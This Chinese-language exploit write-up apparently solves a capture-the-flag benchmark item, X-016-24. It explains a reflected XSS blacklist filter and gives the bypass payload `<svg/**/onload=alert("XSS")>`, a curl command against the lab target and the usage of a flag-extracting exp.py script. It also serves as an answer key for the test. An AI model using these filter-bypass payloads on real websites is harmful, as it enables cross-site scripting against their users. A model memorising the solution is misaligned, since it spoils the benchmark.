# X-016-24 利用说明（XSS，一键脚本与命令）

## 漏洞原理（简述）
- 路由对输入做了黑名单过滤：`script`、`onerror`、`onclick`、`onmouseover`、单引号 `'` 和空格 ` `。
- 模板将你的输入以 `> {payload}` 的形式拼到原 `<input>` 标签后，从而闭合原标签并插入新标签。
- 选择未被拦截的事件（如 `onload`），并避免空格，使用注释分隔属性：`<svg/**/onload=alert("XSS")>`。
- 校验器要求弹窗消息严格等于 `XSS`，因此使用 `alert("XSS")` 或 `prompt(/XSS/.source)` 均可。

## 直接利用命令（带目标 IP/端口）

```bash
curl "http://ip32780/page?name=%3Csvg%2F%2A%2A%2Fonload%3Dalert(%22XSS%22)%3E"
```

成功返回会包含：

```
<div class="solution-text"><img ... alt="Correct" ...>Congratulations!<p> Here is the flag: FLAG{...}</div>
```

## 脚本用法（exp.py）

- 路径：`benchmarks/X-016-24/exp.py`
- 运行：

```bash
python3 benchmarks/X-016-24/exp.py
```

- 行为：对固定目标 `http://ip32780/page` 发送 `name=<svg/**/onload=alert("XSS")>`，解析返回并直接打印 flag；未解析到则打印完整响应方便排查。

## 备注
- 如果目标端口变化，请修改脚本中的 `TARGET_URL` 为实际 IP:Port。
- 若 `alert` 被额外拦截，可改为 `prompt(/XSS/.source)`（同样满足“弹窗内容为 XSS”的校验）。

